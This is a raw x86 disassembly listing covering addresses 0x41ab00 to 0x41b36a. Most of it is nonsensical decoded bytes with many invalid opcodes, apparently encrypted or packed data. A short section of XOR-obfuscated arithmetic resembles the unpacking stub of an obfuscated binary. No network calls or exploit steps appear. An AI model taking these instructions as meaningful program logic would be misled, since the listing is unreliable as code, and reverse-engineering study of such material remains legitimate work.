  41ab00:	repz mov al,0xad
  41ab03:	loope  0x41aad4
  41ab05:	out    dx,eax
  41ab06:	repnz mov al,0xdb
  41ab09:	mov    ebx,0xfef0d2bf
  41ab0e:	shl    ebx,1
  41ab10:	rcl    ah,cl
  41ab12:	lds    eax,FWORD PTR [ebx]
  41ab14:	retf   
  41ab15:	shl    eax,1
  41ab17:	(bad)  
  41ab18:	push   es
  41ab19:	or     ebp,ebx
  41ab1b:	fsubr  st(6),st
  41ab1d:	fsubr  st(7),st
  41ab1f:	mov    esi,0xd5d4f6c0
  41ab24:	cli    
  41ab25:	jmp    0xc91864ee
  41ab2a:	mov    eax,0xe0d6faf1
  41ab2f:	in     eax,dx
  41ab30:	sti    
  41ab31:	neg    cl
  41ab33:	add    eax,ebx
  41ab35:	stc    
  41ab36:	(bad)  
  41ab37:	std    
  41ab38:	leave  
  41ab39:	in     eax,0xfc
  41ab3b:	lds    ecx,FWORD PTR [ecx]
  41ab3d:	in     eax,0xe0
  41ab3f:	jmp    0xc9cc:0xc1b0cccf
  41ab46:	jmp    0xd4347e03
  41ab4b:	clc    
  41ab4c:	shl    esp,cl
  41ab4e:	out    dx,eax
  41ab4f:	loop   0x41ab13
  41ab51:	mov    ebp,0x600d9f2
  41ab56:	fisttp WORD PTR [eax]
  41ab58:	out    dx,eax
  41ab59:	movntq QWORD PTR [eax],mm1
  41ab5c:	std    
  41ab5d:	jecxz  0x41ab06
  41ab5f:	imul   eax
  41ab61:	ret    
  41ab62:	jmp    0xf4d6:0xd2f9f7fb
  41ab69:	int3   
  41ab6a:	mov    edx,0xd3f0d2d5
  41ab6f:	(bad)  
  41ab71:	in     al,dx
  41ab72:	(bad)  
  41ab74:	add    ch,ah
  41ab76:	add    edx,esp
  41ab78:	iret   
  41ab79:	aam    0x8
  41ab7b:	fdiv   st(6),st
  41ab7d:	fild   QWORD PTR [ecx-0x4c293b15]
  41ab83:	xlat   BYTE PTR ds:[ebx]
  41ab84:	int    0xb3
  41ab86:	leave  
  41ab87:	jmp    0xea1e848b
  41ab8c:	mov    ebx,0xd8f7e1cc
  41ab91:	(bad)  
  41ab92:	cld    
  41ab93:	mov    esi,0xf5c1fbbc
  41ab98:	(bad)  
  41ab99:	fimul  DWORD PTR [ebx]
  41ab9b:	jecxz  0x41ab87
  41ab9d:	stc    
  41ab9e:	retf   0xccac
  41aba1:	test   bh,0xf6
  41aba4:	iret   
  41aba5:	in     eax,0xcf
  41aba7:	int3   
  41aba8:	out    0xe9,eax
  41abaa:	cld    
  41abab:	in     eax,dx
  41abac:	out    dx,al
  41abad:	iret   
  41abae:	jecxz  0x41abaa
  41abb0:	rol    DWORD PTR [edx],1
  41abb2:	fdiv   st,st(2)
  41abb4:	std    
  41abb5:	add    eax,0xf05c0e4
  41abba:	(bad)  
  41abbb:	in     al,0xd9
  41abbd:	pop    es
  41abbe:	fbstp  TBYTE PTR [eax-0x2e522f2f]
  41abc4:	shl    BYTE PTR [ecx-0x3736250a],0xc8
  41abcb:	fnstcw WORD PTR [ecx-0x12071132]
  41abd1:	out    0xc7,al
  41abd3:	rcl    eax,1
  41abd5:	rcl    ebp,0xf6
  41abd8:	stc    
  41abd9:	cld    
  41abda:	faddp  st(6),st
  41abdc:	int3   
  41abdd:	(bad)  
  41abdf:	jmp    0xb2ee:0xd0ddccc7
  41abe6:	retf   0xe8e0
  41abe9:	repz fnstenv [eax+edi*4-0x1049fe1e]
  41abf1:	sti    
  41abf2:	add    ch,al
  41abf4:	fld    DWORD PTR [esi+edi*8]
  41abf7:	std    
  41abf8:	loopne 0x41ac01
  41abfa:	loopne 0x41abd0
  41abfc:	or     al,0xda
  41abfe:	loopne 0x41abc4
  41ac00:	mov    ebp,0xcccae1ac
  41ac05:	mov    edx,0xacadcecb
  41ac0a:	int    0xbb
  41ac0c:	loop   0x41ac0b
  41ac0e:	mov    eax,0xf4c0bcf4
  41ac13:	(bad)  
  41ac14:	in     al,0xe2
  41ac16:	loop   0x41abf0
  41ac18:	enter  0x8e9,0xe9
  41ac1c:	shl    edx,0xe0
  41ac1f:	in     al,0xef
  41ac21:	ret    0xd5c9
  41ac24:	ret    0xf2ef
  41ac27:	aad    0xec
  41ac29:	test   ebx,0xf2dad2e9
  41ac2f:	in     al,dx
  41ac30:	icebp  
  41ac31:	ret    
  41ac32:	repnz push es
  41ac34:	cld    
  41ac35:	(bad)  
  41ac37:	rol    edi,0xd4
  41ac3a:	retf   0xc901
  41ac3d:	shr    ch,cl
  41ac3f:	in     eax,dx
  41ac40:	lods   al,BYTE PTR ds:[esi]
  41ac41:	iret   
  41ac42:	(bad)  
  41ac43:	shl    BYTE PTR [eax+ebp*4-0xa3a0514],1
  41ac4a:	fucomip st,st(7)
  41ac4c:	shl    bh,cl
  41ac4e:	mov    esi,0xd6fbd4c3
  41ac53:	div    edi
  41ac55:	out    0xd7,al
  41ac57:	dec    DWORD PTR [edi]
  41ac59:	push   es
  41ac5a:	(bad)
  41ac5d:	int    0xc5
  41ac5f:	retf   0xcacc
  41ac62:	(bad)  
  41ac64:	mov    ah,0xc7
  41ac66:	icebp  
  41ac67:	hlt    
  41ac68:	sar    dh,1
  41ac6a:	icebp  
  41ac6b:	shr    dl,1
  41ac6d:	sar    esi,cl
  41ac6f:	out    dx,al
  41ac70:	(bad)  
  41ac72:	rcl    ebx,0xd3
  41ac75:	add    al,0xff
  41ac77:	test   BYTE PTR [edi],0xeb
  41ac7a:	fucomip st,st(5)
  41ac7c:	or     ebx,edi
  41ac7e:	iret   
  41ac7f:	mov    esp,0xefb3dee6
  41ac84:	jmp    0xb3c5:0xf5f9c8fb
  41ac8b:	fsubr  st,st(2)
  41ac8d:	mov    al,0xfd
  41ac8f:	call   0xe3279967
  41ac94:	out    0xe5,eax
  41ac96:	loopne 0x41ac8c
  41ac98:	fimul  WORD PTR ds:0xc003eadb
  41ac9e:	rcr    al,cl
  41aca0:	out    0xcc,eax
  41aca2:	out    dx,al
  41aca3:	iret   
  41aca4:	(bad)
  41aca7:	test   bl,0xe4
  41acaa:	mov    bl,0xcd
  41acac:	fmulp  st(6),st
  41acae:	sar    esi,1
  41acb0:	(bad)  
  41acb1:	std    
  41acb2:	push   es
  41acb3:	mov    esi,0xc9e1f4c7
  41acb8:	std    
  41acb9:	fcmove st,st(1)
  41acbb:	or     ah,bh
  41acbd:	in     al,0xb1
  41acbf:	mov    dl,0xef
  41acc1:	(bad)
  41acc4:	mov    ah,0xc5
  41acc6:	call   0xba1492c5
  41accb:	hlt    
  41accc:	add    cl,dh
  41acce:	div    ch
  41acd0:	cmc    
  41acd1:	icebp  
  41acd2:	div    edx
  41acd4:	fprem1 
  41acd6:	neg    ah
  41acd8:	sti    
  41acd9:	inc    dh
  41acdb:	int    0xd3
  41acdd:	jmp    0x41ac9f
  41acdf:	jecxz  0x41accb
  41ace1:	out    dx,eax
  41ace2:	stos   DWORD PTR es:[edi],eax
  41ace3:	test   edi,0xf5d5bbc2
  41ace9:	shl    DWORD PTR [ebp-0x1d0a1227],1
  41acef:	cld    
  41acf0:	rol    BYTE PTR [esi],0xec
  41acf3:	mov    ebp,0xfee8dafb
  41acf8:	cli    
  41acf9:	or     eax,0xe10cdbea
  41acfe:	mov    dl,0xac
  41ad00:	iret   
  41ad01:	mov    esi,0xcbb3f5d6
  41ad06:	mov    cl,0xcf
  41ad08:	out    dx,al
  41ad09:	hlt    
  41ad0a:	mov    ebx,0xf5ddd1f0
  41ad0f:	out    dx,al
  41ad10:	iret   
  41ad11:	loope  0x41acf8
  41ad13:	(bad)  
  41ad14:	(bad)  
  41ad16:	stc    
  41ad17:	out    dx,eax
  41ad18:	out    dx,al
  41ad19:	loopne 0x41acf0
  41ad1b:	add    DWORD PTR [ebx],eax
  41ad1d:	or     edi,ecx
  41ad1f:	shl    esi,0xb2
  41ad22:	scas   al,BYTE PTR es:[edi]
  41ad23:	scas   al,BYTE PTR es:[edi]
  41ad24:	out    0xe8,eax
  41ad26:	jmp    0x3b8:0xfdf3b4ee
  41ad2d:	mov    ah,0xf1
  41ad2f:	test   BYTE PTR [eax],0xcd
  41ad32:	add    bh,ah
  41ad34:	fisttp DWORD PTR [ebx]
  41ad36:	rcr    bl,1
  41ad38:	dec    BYTE PTR [esi]
  41ad3a:	call   0xad45973b
  41ad3f:	scas   eax,DWORD PTR es:[edi]
  41ad40:	shl    al,1
  41ad42:	aad    0xc9
  41ad44:	mov    dl,0xd5
  41ad46:	mov    al,0xca
  41ad48:	in     al,0xf3
  41ad4a:	fadd   QWORD PTR [ebx]
  41ad4c:	cld    
  41ad4d:	(bad)  
  41ad4e:	idiv   al
  41ad50:	cld    
  41ad51:	into   
  41ad52:	ret    
  41ad53:	cmc    
  41ad54:	(bad)
  41ad57:	out    0xde,al
  41ad59:	test   ah,0x4
  41ad5c:	loopne 0x41ad43
  41ad5e:	mov    esp,0xc4c5c0ce
  41ad63:	loope  0x41ad60
  41ad65:	leave  
  41ad66:	in     al,0xd6
  41ad68:	sar    DWORD PTR [eax-0x3463528],1
  41ad6e:	iret   
  41ad6f:	int3   
  41ad70:	mov    eax,0xe204c5d3
  41ad75:	or     edi,ebx
  41ad77:	stc    
  41ad78:	(bad)  
  41ad7a:	cmc    
  41ad7b:	cli    
  41ad7c:	jmp    0xdd077c7b
  41ad81:	repz shl BYTE PTR [edx-0x2d0f484b],cl
  41ad88:	retf   0xfcf7
  41ad8b:	lock sar BYTE PTR [eax-0x2efc0a25],1
  41ad92:	in     eax,0x7
  41ad94:	pop    es
  41ad95:	or     eax,edi
  41ad97:	cli    
  41ad98:	les    eax,FWORD PTR [esi]
  41ad9a:	enter  0xe30f,0xeb
  41ad9e:	fsubrp st(3),st
  41ada0:	ror    cl,0xe2
  41ada3:	ret    
  41ada4:	fld    TBYTE PTR [eax-0x4701390c]
  41adaa:	stc    
  41adab:	out    dx,eax
  41adac:	int3   
  41adad:	(bad)  
  41adae:	clc    
  41adaf:	add    ecx,esp
  41adb1:	fstp   st(7)
  41adb3:	icebp  
  41adb4:	add    al,0xe4
  41adb6:	add    al,dh
  41adb8:	in     al,0xd5
  41adba:	cld    
  41adbb:	retf   
  41adbc:	std    
  41adbd:	repnz in eax,dx
  41adbf:	lock shl ebx,1
  41adc2:	loop   0x41adb5
  41adc4:	aad    0xbb
  41adc6:	retf   0xe6d2
  41adc9:	(bad)  
  41adca:	in     al,dx
  41adcb:	stc    
  41adcc:	repz add cl,ch
  41adcf:	hlt    
  41add0:	loope  0x41adcf
  41add2:	stc    
  41add3:	in     al,dx
  41add4:	mov    esp,0xe3fae3d2
  41add9:	iret   
  41adda:	jmp    0xeebc:0xe6ece8d8
  41ade1:	mul    esp
  41ade3:	lods   al,BYTE PTR ds:[esi]
  41ade4:	out    dx,al
  41ade5:	lock jmp 0x41adde
  41ade8:	(bad)  
  41ade9:	lock hlt 
  41adeb:	cmc    
  41adec:	in     al,dx
  41aded:	(bad)  
  41adee:	cli    
  41adef:	loope  0x41adb3
  41adf1:	div    eax
  41adf3:	fdivrp st(4),st
  41adf5:	mov    esp,0xdb0200d1
  41adfa:	add    ah,dh
  41adfc:	or     ecx,DWORD PTR [eax]
  41adfe:	mov    ebx,0xd0cad2e7
  41ae04:	aam    0xa8
  41ae06:	leave  
  41ae07:	fxch   st(4)
  41ae09:	ffreep st(5)
  41ae0b:	retf   
  41ae0c:	test   cl,0xfa
  41ae0f:	fld    QWORD PTR [ebx]
  41ae11:	hlt    
  41ae12:	(bad)  
  41ae14:	mov    esp,0xf6f705d9
  41ae19:	fld    DWORD PTR [eax]
  41ae1b:	cli    
  41ae1c:	fisttp DWORD PTR [eax]
  41ae1e:	lods   al,BYTE PTR ds:[esi]
  41ae1f:	mov    bl,0xc6
  41ae21:	jmp    0xb0d3:0xfbc4eed2
  41ae28:	cmc    
  41ae29:	call   0xde198527
  41ae2e:	stc    
  41ae2f:	rol    DWORD PTR [edi],1
  41ae31:	shl    al,0xe5
  41ae34:	(bad)
  41ae38:	iret   
  41ae39:	loop   0x41ae15
  41ae3b:	fmul   DWORD PTR ds:0xbee4e302
  41ae41:	retf   0xb2bc
  41ae44:	repnz in al,0xd2
  41ae47:	mov    eax,0xdcc5bec5
  41ae4c:	jecxz  0x41ae2d
  41ae4e:	call   0xe704ab0b
  41ae53:	add    eax,0xe8ebf0cb
  41ae58:	jmp    0xe523b931
  41ae5d:	adc    ecx,esp
  41ae5f:	out    dx,al
  41ae60:	out    dx,eax
  41ae61:	shr    edx,0xae
  41ae64:	mov    ebx,0xb9c8ecb3
  41ae69:	mov    ebx,0xdaf2d7d1
  41ae6e:	stc    
  41ae6f:	shl    ecx,cl
  41ae71:	sti    
  41ae72:	add    edi,DWORD PTR [edx-0x93d253f]
  41ae78:	out    0x9,eax
  41ae7a:	fisttp WORD PTR ds:0xaad809e9
  41ae80:	int    0xa4
  41ae82:	in     eax,0xf0
  41ae84:	lock repnz in al,0xc8
  41ae88:	fcomp  st(6)
  41ae8a:	icebp  
  41ae8b:	(bad)  
  41ae8c:	std    
  41ae8d:	shr    ah,cl
  41ae8f:	mov    eax,0xc0d3d702
  41ae94:	repz or cl,bl
  41ae97:	loope  0x41aea0
  41ae99:	push   cs
  41ae9a:	or     edi,eax
  41ae9c:	jmp    0x41aea1
  41ae9e:	lods   eax,DWORD PTR ds:[esi]
  41ae9f:	mov    ebp,0xe1c2e7d7
  41aea4:	in     al,0xca
  41aea6:	into   
  41aea7:	jmp    0xffd7:0xdebfceb9
  41aeae:	rcl    bl,1
  41aeb0:	loope  0x41aeb4
  41aeb2:	rol    BYTE PTR [ebx],0xc1
  41aeb5:	dec    BYTE PTR [ebx]
  41aeb7:	rcr    ebx,0xf8
  41aeba:	in     al,dx
  41aebb:	(bad)  
  41aebd:	les    esi,FWORD PTR [edx-0x2a3f210e]
  41aec3:	scas   al,BYTE PTR es:[edi]
  41aec4:	jmp    0xf5e5:0xcdd3cbe4
  41aecb:	cli    
  41aecc:	mov    ebx,0xfac3faf1
  41aed1:	(bad)  
  41aed2:	(bad)  
  41aed3:	shl    bh,0xe3
  41aed6:	sti    
  41aed7:	jmp    0xe1c4:0xe3fbf6e1
  41aede:	(bad)  
  41aedf:	in     eax,dx
  41aee0:	jmp    0xe4298cba
  41aee5:	(bad)  
  41aee6:	repnz sar eax,1
  41aee9:	stc    
  41aeea:	mov    ebp,0x1c3d6d3
  41aeef:	mov    edi,0xbee6dfda
  41aef4:	test   dl,0xc7
  41aef7:	lock (bad) 
  41aef9:	sti    
  41aefa:	in     al,0xe
  41aefc:	adc    bh,dl
  41aefe:	in     al,0xdd
  41af00:	repnz mov cl,0xb6
  41af03:	rcl    edx,1
  41af05:	in     al,dx
  41af06:	scas   eax,DWORD PTR es:[edi]
  41af07:	(bad)  
  41af08:	call   0xee2687fd
  41af0d:	into   
  41af0e:	icebp  
  41af0f:	jecxz  0x41aece
  41af11:	mov    esi,0xe5c3ecfa
  41af16:	(bad)  
  41af17:	loop   0x41aeff
  41af19:	test   BYTE PTR [ebx],0x5
  41af1c:	dec    al
  41af1e:	fcomip st,st(0)
  41af20:	rcl    cl,1
  41af22:	mov    al,0xd6
  41af24:	call   0xd2396009
  41af29:	dec    ebx
  41af2b:	in     al,dx
  41af2c:	mov    eax,0xd2eecdee
  41af31:	in     al,dx
  41af32:	jecxz  0x41af17
  41af34:	aam    0x9
  41af36:	xlat   BYTE PTR ds:[ebx]
  41af37:	sti    
  41af38:	jmp    0xe62f8c3e
  41af3d:	retf   0xe1be
  41af40:	fst    st(2)
  41af42:	rol    dh,cl
  41af44:	aam    0xe7
  41af46:	mov    ecx,0xd1c8cab5
  41af4b:	div    bl
  41af4d:	leave  
  41af4e:	ror    edi,0xbe
  41af51:	add    esi,edi
  41af53:	add    eax,0xfc0bdcf2
  41af58:	stc    
  41af59:	out    dx,eax
  41af5a:	push   es
  41af5b:	or     eax,0xb8b2f904
  41af60:	icebp  
  41af61:	bnd jmp 0x41af4a
  41af64:	div    bh
  41af66:	jmp    0xeb0d7e65
  41af6b:	enter  0xe1ec,0xb8
  41af6f:	out    dx,eax
  41af70:	mov    esi,0xc405e403
  41af75:	icebp  
  41af76:	(bad)
  41af79:	in     eax,dx
  41af7a:	retf   0xc802
  41af7d:	call   0xbdf25951
  41af82:	out    0xca,al
  41af84:	retf   0xefcf
  41af87:	mov    al,0xb9
  41af89:	leave  
  41af8a:	mov    edx,0x3bec8f7
  41af8f:	sti    
  41af90:	add    al,dh
  41af92:	std    
  41af93:	(bad)  
  41af94:	fcmovb st,st(6)
  41af96:	ret    0xdee6
  41af99:	fmul   st(6),st
  41af9b:	pop    es
  41af9c:	fsubp  st(5),st
  41af9e:	lods   eax,DWORD PTR ds:[esi]
  41af9f:	mov    esi,0xcdb6eaed
  41afa4:	aam    0xf7
  41afa6:	mov    ecx,0xd5fee7df
  41afab:	repz repnz hlt 
  41afae:	mov    esp,0xf5fcc3ff
  41afb3:	repz add BYTE PTR [edi],al
  41afb6:	or     al,bh
  41afb8:	fcomi  st,st(6)
  41afba:	out    dx,eax
  41afbb:	in     eax,0xff
  41afbd:	icebp  
  41afbe:	fsubrp st(0),st
  41afc0:	(bad)
  41afc3:	aam    0xe0
  41afc5:	ret    0xf8cd
  41afc8:	enter  0xfb05,0x72
  41afcc:	xor    al,BYTE PTR [eax]
  41afce:	mov    ecx,DWORD PTR [ebp-0x13c]
  41afd4:	sub    ecx,eax
  41afd6:	mov    DWORD PTR [ebp-0x10c],ecx
  41afdc:	mov    DWORD PTR [ebp-0x114],0xf89c85bf
  41afe6:	cmp    DWORD PTR [ebp-0x104],0xf89c85b0
  41aff0:	je     0x421d21
  41aff6:	mov    eax,DWORD PTR [ebp-0x11c]
  41affc:	xor    eax,0x75108b5
  41b001:	mov    ecx,DWORD PTR [ebp-0x11c]
  41b007:	xor    ecx,0x75108b5
  41b00d:	lea    ecx,[eax+ecx*1+0x64e5f6]
  41b014:	mov    eax,DWORD PTR [ebp-0x10c]
  41b01a:	xor    edx,edx
  41b01c:	div    ecx
  41b01e:	mov    eax,DWORD PTR [ebp-0x104]
  41b024:	xor    eax,0x75108b5
  41b029:	add    eax,0x3272fb
  41b02e:	mov    ecx,DWORD PTR [ebp-0x11c]
  41b034:	xor    ecx,0x75108b5
  41b03a:	jmp    0x41d3e0
  41b03f:	cli    
  41b040:	adc    BYTE PTR [ebx+0x2c24b1fd],ch
  41b046:	adc    al,0x9e
  41b048:	pmulhuw mm0,QWORD PTR [esi]
  41b04b:	dec    edx
  41b04c:	or     ebp,DWORD PTR [ebx+esi*1]
  41b04f:	rcr    dl,0x7a
  41b052:	jnp    0x41b056
  41b054:	cwde   
  41b055:	jnp    0x41b0d2
  41b057:	std    
  41b058:	cld    
  41b059:	into   
  41b05a:	stc    
  41b05b:	into   
  41b05c:	(bad)  
  41b05e:	fdivr  st,st(2)
  41b060:	add    eax,0xdfc10a05
  41b065:	xlat   BYTE PTR ds:[ebx]
  41b066:	loop   0x41b06a
  41b068:	fucomp st(5)
  41b06a:	add    cl,BYTE PTR [ebx]
  41b06c:	into   
  41b06d:	ret    0xcceb
  41b070:	jecxz  0x41b034
  41b072:	repz fcmovb st,st(5)
  41b075:	loopne 0x41b076
  41b077:	mov    ebx,0xbfceefba
  41b07c:	icebp  
  41b07d:	ret    0xc202
  41b080:	lock fadd DWORD PTR ds:0xf8f7e7c4
  41b087:	out    0xca,eax
  41b089:	add    bh,bh
  41b08b:	fdiv   st,st(0)
  41b08d:	mov    eax,0xcee0e7c1
  41b092:	int3   
  41b093:	leave  
  41b094:	repnz hlt 
  41b096:	in     al,0xc8
  41b098:	(bad)  
  41b09a:	shl    dl,cl
  41b09c:	loope  0x41b072
  41b09e:	cli    
  41b09f:	sar    edx,0xd4
  41b0a2:	add    esp,esp
  41b0a4:	icebp  
  41b0a5:	(bad)  
  41b0a6:	(bad)  
  41b0a8:	or     bl,cl
  41b0aa:	jecxz  0x41b0b6
  41b0ac:	iret   
  41b0ad:	mov    cl,0xf6
  41b0af:	mov    eax,0xd2c0ebf6
  41b0b5:	leave  
  41b0b6:	jmp    0xb60a99a8
  41b0bb:	mov    ah,0xe9
  41b0bd:	not    eax
  41b0bf:	loop   0x41b096
  41b0c1:	shl    al,1
  41b0c3:	jmp    0xf4f8:0xd505fc07
  41b0ca:	add    edi,edx
  41b0cc:	mov    edi,0xd5dec8de
  41b0d1:	mov    dl,0xa9
  41b0d3:	repnz hlt 
  41b0d5:	loopne 0x41b0d5
  41b0d7:	(bad)  
  41b0d8:	fst    st(1)
  41b0da:	dec    edx
  41b0dc:	int3   
  41b0dd:	fcmovnb st,st(2)
  41b0df:	clc    
  41b0e0:	(bad)  
  41b0e2:	hlt    
  41b0e3:	(bad)  
  41b0e4:	jmp    0x41b0cc
  41b0e6:	in     al,0xd
  41b0e8:	call   0xaa2879fb
  41b0ed:	fbstp  TBYTE PTR [edx-0x291b0e1e]
  41b0f3:	les    edi,FWORD PTR [ecx-0x172f370d]
  41b0f9:	in     eax,dx
  41b0fa:	enter  0xfbed,0xba
  41b0fe:	into   
  41b0ff:	rol    edi,1
  41b101:	(bad)  
  41b103:	or     esp,eax
  41b105:	sar    ch,0xd
  41b108:	out    0xe,eax
  41b10a:	out    0xd2,eax
  41b10c:	fadd   st(1),st
  41b10e:	shr    esi,cl
  41b110:	mov    bh,0xf4
  41b112:	call   0xda377ce0
  41b117:	mov    ch,0xb6
  41b119:	rcr    edi,cl
  41b11b:	enter  0xfafd,0xf9
  41b11f:	loop   0x41b106
  41b121:	fcmovnb st,st(7)
  41b123:	push   es
  41b124:	inc    DWORD PTR [edi]
  41b126:	push   cs
  41b127:	(bad)  
  41b128:	fiadd  WORD PTR ds:0xefd20bce
  41b12e:	in     eax,0xae
  41b130:	(bad)  
  41b132:	loop   0x41b0e5
  41b134:	shl    BYTE PTR [esp+esi*8-0x32460b4c],cl
  41b13b:	mov    ah,0x1
  41b13d:	cld    
  41b13e:	loop   0x41b102
  41b140:	jecxz  0x41b149
  41b142:	cli    
  41b143:	stc    
  41b144:	jmp    ecx
  41b146:	cli    
  41b147:	out    0xf8,eax
  41b149:	jmp    0xdcf0:0xecdc0adb
  41b150:	out    0xb7,eax
  41b152:	(bad)  
  41b153:	shr    edi,1
  41b155:	mov    edx,0xe8d8d1c4
  41b15a:	add    esp,ebx
  41b15c:	add    ah,dl
  41b15e:	out    0xbe,al
  41b160:	test   edi,0xd4fb07ff
  41b166:	retf   0xc8e2
  41b169:	ftst   
  41b16b:	retf   0xdcd9
  41b16e:	loopne 0x41b160
  41b170:	mov    ch,0xcb
  41b172:	shr    bl,cl
  41b174:	icebp  
  41b175:	(bad)  
  41b177:	fcmovbe st,st(4)
  41b179:	cli    
  41b17a:	fsub   st(4),st
  41b17c:	fnstcw WORD PTR [edx-0x141df80c]
  41b182:	pop    es
  41b183:	fdivr  st,st(1)
  41b185:	mov    esi,0xc2fbe0f6
  41b18a:	repz out 0xce,eax
  41b18d:	mov    esp,0xe2b0e3c0
  41b192:	out    0xdb,eax
  41b194:	in     al,0xc7
  41b196:	mov    dh,0xd7
  41b198:	cld    
  41b199:	call   0xd42eb56b
  41b19e:	fdivp  st(4),st
  41b1a0:	stc    
  41b1a1:	hlt    
  41b1a2:	add    al,0x6
  41b1a4:	add    edi,ebp
  41b1a6:	jmp    0x41b18e
  41b1a8:	fsubr  st(4),st
  41b1aa:	add    ecx,esi
  41b1ac:	mov    ecx,0xd0e6bdd1
  41b1b1:	(bad)  
  41b1b2:	mov    ebx,0xfad5c9f3
  41b1b7:	sti    
  41b1b8:	repnz fdivr QWORD PTR [eax-0x30201e27]
  41b1bf:	in     eax,0xbe
  41b1c1:	xlat   BYTE PTR ds:[ebx]
  41b1c2:	(bad)  
  41b1c3:	aad    0xc3
  41b1c5:	add    al,0xc5
  41b1c7:	or     eax,0xd8eb03e9
  41b1cc:	int    0xf0
  41b1ce:	ret    0xe3e5
  41b1d1:	cmc    
  41b1d2:	xlat   BYTE PTR ds:[ebx]
  41b1d3:	call   0xef0b7eca
  41b1d8:	fcmovu st,st(1)
  41b1da:	cmc    
  41b1db:	call   0xd43672e0
  41b1e0:	loop   0x41b1d4
  41b1e2:	loop   0x41b1af
  41b1e4:	div    esi
  41b1e6:	out    0xc4,eax
  41b1e8:	sti    
  41b1e9:	lds    edx,FWORD PTR [ebx]
  41b1eb:	in     eax,dx
  41b1ec:	rol    al,cl
  41b1ee:	icebp  
  41b1ef:	enter  0xb5ad,0xfa
  41b1f3:	iret   
  41b1f4:	in     al,0xeb
  41b1f6:	mov    eax,0xc3d0ffda
  41b1fb:	aam    0xfd
  41b1fd:	mov    ecx,0xdfd2c1ce
  41b202:	(bad)  
  41b203:	in     eax,0xc3
  41b205:	(bad)  
  41b208:	call   0xcd02aeef
  41b20d:	icebp  
  41b20e:	int    0xdc
  41b210:	repz in eax,dx
  41b212:	call   0xf238a20c
  41b217:	repz mov esi,0xfaf8c8be
  41b21d:	add    ebp,ebp
  41b21f:	in     eax,dx
  41b220:	lock rol BYTE PTR [ebx+ecx*8],cl
  41b224:	pop    es
  41b225:	enter  0xcac5,0xee
  41b229:	sti    
  41b22a:	or     ecx,DWORD PTR [edx]
  41b22c:	jmp    0xb6198ffc
  41b231:	hlt    
  41b232:	enter  0xb2ac,0xdb
  41b236:	fistp  QWORD PTR [ecx-0x27212914]
  41b23c:	add    ecx,esp
  41b23e:	out    dx,al
  41b23f:	pop    es
  41b240:	jecxz  0x41b249
  41b242:	push   ecx
  41b244:	(bad)  
  41b246:	cli    
  41b247:	(bad)  
  41b249:	(bad)  
  41b24a:	fdivr  st(1),st
  41b24c:	shl    al,cl
  41b24e:	(bad)
  41b251:	(bad)  
  41b252:	leave  
  41b253:	mov    edx,0xc5e6baf8
  41b258:	shl    bl,cl
  41b25a:	lock repnz sar edx,cl
  41b25e:	loope  0x41b22c
  41b260:	in     eax,0xf8
  41b262:	add    al,0xe3
  41b264:	call   0xea21a95d
  41b269:	(bad)  
  41b26b:	int    0xf3
  41b26d:	(bad)  
  41b26f:	scas   al,BYTE PTR es:[edi]
  41b270:	mov    dl,0xe6
  41b272:	jmp    0xd0fbaa72
  41b277:	cli    
  41b278:	into   
  41b279:	fmul   st(6),st
  41b27b:	xlat   BYTE PTR ds:[ebx]
  41b27c:	fcmove st,st(0)
  41b27e:	neg    dl
  41b280:	aam    0xfe
  41b282:	shl    eax,0x8
  41b285:	sti    
  41b286:	add    cl,dh
  41b288:	ret    
  41b289:	(bad)  
  41b28b:	loope  0x41b237
  41b28d:	test   al,0xf3
  41b28f:	rcl    ecx,1
  41b291:	call   0xb207815a
  41b296:	repz int3 
  41b298:	mov    ebx,0xcdfdfcf9
  41b29d:	hlt    
  41b29e:	stc    
  41b29f:	(bad)  
  41b2a0:	imul   ah
  41b2a2:	fndisi(8087 only) 
  41b2a4:	fucomip st,st(2)
  41b2a6:	push   cs
  41b2a7:	fsub   st,st(4)
  41b2a9:	in     eax,0xca
  41b2ab:	adc    DWORD PTR [esi-0x38423732],edi
  41b2b1:	in     al,0xb0
  41b2b3:	jmp    0x41b2ad
  41b2b5:	aam    0xc7
  41b2b7:	jmp    0xc1cd:0xb8d7eccf
  41b2be:	(bad)  
  41b2c0:	ret    
  41b2c1:	mov    esp,0xd8fcfed4
  41b2c6:	mov    BYTE PTR [esp+edx*8],0x13
  41b2ca:	repnz or eax,0xccdea9ef
  41b2d0:	lock rcl ecx,0xb0
  41b2d4:	fld    st(0)
  41b2d6:	in     al,dx
  41b2d7:	retf   0xe4e8
  41b2da:	aam    0xd5
  41b2dc:	add    edx,ecx
  41b2de:	mov    ch,0xbd
  41b2e0:	push   es
  41b2e1:	jmp    0x41b2a9
  41b2e3:	add    dl,ch
  41b2e5:	or     ecx,DWORD PTR [ecx]
  41b2e7:	leave  
  41b2e8:	fsubrp st(4),st
  41b2ea:	int    0xe1
  41b2ec:	repnz (bad) 
  41b2ee:	loop   0x41b2a0
  41b2f0:	out    0xb7,eax
  41b2f2:	in     eax,dx
  41b2f3:	(bad)  
  41b2f4:	out    dx,al
  41b2f5:	(bad)  
  41b2f6:	(bad)  
  41b2f7:	ror    bh,cl
  41b2f9:	(bad)  
  41b2fb:	fidivr DWORD PTR [eax-0x2b0b282a]
  41b301:	(bad)
  41b304:	fucomi st,st(0)
  41b306:	iret   
  41b307:	add    al,0x0
  41b309:	sti    
  41b30a:	shl    ecx,0xf2
  41b30d:	out    0xad,al
  41b30f:	mov    esi,0xc0f5eab5
  41b314:	idiv   ebx
  41b316:	shl    dl,1
  41b318:	mov    bh,0xef
  41b31a:	enter  0xc1bb,0xf7
  41b31e:	out    0xd1,al
  41b320:	mov    esi,0xc6d1f9f9
  41b325:	or     ah,dl
  41b327:	fcmovne st,st(6)
  41b329:	out    dx,al
  41b32a:	add    DWORD PTR [edx],ecx
  41b32c:	rol    eax,1
  41b32e:	test   eax,0xeac9dcca
  41b333:	jmp    0xb9f2:0xefffc6d9
  41b33a:	add    bl,bl
  41b33c:	fld    st(0)
  41b33e:	shr    ah,1
  41b340:	mov    ebp,0xd8ded1be
  41b345:	lock cld 
  41b347:	(bad)  
  41b348:	cli    
  41b349:	pop    es
  41b34a:	add    ebx,esi
  41b34c:	scas   al,BYTE PTR es:[edi]
  41b34d:	out    0xf7,al
  41b34f:	aad    0xdc
  41b351:	loop   0x41b30e
  41b353:	les    edi,FWORD PTR [ecx-0x2a073101]
  41b359:	rol    BYTE PTR [ebx],1
  41b35b:	stc    
  41b35c:	enter  0xd6ef,0xc2
  41b360:	fdiv   st,st(3)
  41b362:	fsubp  st(1),st
  41b364:	lock (bad) 
  41b367:	mov    BYTE PTR [esi],0xf4
  41b36a:	add    ebp,edi
